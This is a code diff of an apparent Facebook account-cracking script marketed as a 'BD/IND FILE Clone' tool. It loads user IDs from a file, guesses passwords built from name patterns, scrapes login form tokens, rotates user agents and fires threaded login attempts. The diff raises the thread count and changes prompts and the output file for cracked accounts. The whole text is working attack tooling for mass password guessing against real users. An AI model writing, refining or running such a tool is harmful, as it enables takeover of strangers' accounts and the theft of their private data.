@@ -495,11 +495,11 @@ def filee():
     global oks, loop
     pwx = []
     sort.logo()
-    print("[b]    [red1][B] [spring_green1]BD/IND FILE Clone")
+    print("[b]    [red1]✗ [chartreuse1] [spring_green1]BD/IND FILE Clone")
     print(sort.line())
-    print("[b] Π[chartreuse1]TYPE YOUR FILE PATH EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] "
+    print("[b] [chartreuse1]TYPE YOUR FILE PATH EXAMPLE      [b deep_pink2]->[/b deep_pink2]  [chartreuse1] "
           "/sdcard/id.txt")
-    path = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
+    path = str(input(" \x1b[38;1;198m  \x1b[38;5;155mCHOICE      \x1b[38;5;196m-> \x1b[1;97m   "))
     print(sort.line())
     try:
         with open(path, "r") as file:
@@ -507,27 +507,27 @@ def filee():
     except Exception as e:
         print("Error:", e)
         filee()
-    limit = int(input("   Password Limit -> "))
+    limit = int(input("[b]    [red1]✗ [chartreuse1] [spring_green1]Password Limit -> "))
     print(sort.line())
     for i in range(limit):
         print(
-            " [b] Π[chartreuse1]TYPE PASSWORD. EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] first123, First123, last123, last@@@")
+            " [b] [chartreuse1]TYPE PASSWORD. EXAMPLE      [b deep_pink2]->[/b deep_pink2]  [chartreuse1] first123, First123, last123, last@@@")
         passw = str(input(" \x1b[38;1;198m Π \x1b[38;5;155mAdd Pass    \x1b[38;5;196m⟩ \x1b[1;97m   "))
         if passw not in pwx:
             pwx.append(passw)
         print(sort.line())
-    print("  [r dark_olive_green1]Π1[/r dark_olive_green1][b violet] Method 1")
-    print("  [r dark_olive_green1]Π2[/r dark_olive_green1][b violet] Method 2")
-    print("  [r dark_olive_green1]Π3[/r dark_olive_green1][b violet] Method 3")
-    print("  [r dark_olive_green1]Π4[/r dark_olive_green1][b violet] Method 4")
-    print("  [r dark_olive_green1]Π5[/r dark_olive_green1][b violet] Method 5")
-    print("  [r dark_olive_green1]Π6[/r dark_olive_green1][b violet] Method 6")
-    print("  [r dark_olive_green1]Π7[/r dark_olive_green1][b violet] Method 7")
-    print("  [r dark_olive_green1]Π8[/r dark_olive_green1][b violet] Method 8")
+    print("  [r dark_olive_green1]N1[/r dark_olive_green1][b violet] Method 1")
+    print("  [r dark_olive_green1]N2[/r dark_olive_green1][b violet] Method 2")
+    print("  [r dark_olive_green1]N3[/r dark_olive_green1][b violet] Method 3")
+    print("  [r dark_olive_green1]N4[/r dark_olive_green1][b violet] Method 4")
+    print("  [r dark_olive_green1]N5[/r dark_olive_green1][b violet] Method 5")
+    print("  [r dark_olive_green1]N6[/r dark_olive_green1][b violet] Method 6")
+    print("  [r dark_olive_green1]N7[/r dark_olive_green1][b violet] Method 7")
+    print("  [r dark_olive_green1]N8[/r dark_olive_green1][b violet] Method 8")
     print(sort.line())
-    meth = str(input("  \x1b[38;1;198mΠ\x1b[38;5;155mCHOICE  \x1b[38;5;196m⟩ \x1b[1;97m   "))
+    meth = str(input("  \x1b[38;1;198mΠ\x1b[38;5;155mCHOICE  \x1b[38;5;196m-> \x1b[1;97m   "))
     print(sort.line())
-    with ThreadPool(max_workers=40) as sub:
+    with ThreadPool(max_workers=70) as sub:
         sort.clear()
         print(sort.logo())
         print(
@@ -535,14 +535,15 @@ def filee():
         print(sort.line())
         try:
             for xd in fl:
-                uid, name = xd.split("|")
+                uid = xd.split("|")[0]
+                name = xd.split("|")[1]
                 sub.submit(file_sub, uid, pwx, name, meth, fl)
 
         except:
             pass
     print("\r\r" + sort.line())
     print(f"  Π! Total OK id : {str(len(oks))}")
-    print(f"  Π! Save  /sdcard/pot.txt ")
+    print(f"  Π! Save  /sdcard/PRINCEFILE-OK.txt ")
     print(sort.line())
     sys.exit()
 
@@ -642,7 +643,7 @@ def ren_sub(uid, pwx, meth, user, fb):
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number": "0",
                     "unrecognized_tries": "0", "email": uid, "pass": ps, "login": "Log In"}
-            uax = ua()
+            uax = uaxxxx()
             ver1 = str(random.randrange(1, 99))
             ver2 = str(random.randrange(90, 121))
             lsd = lsb()
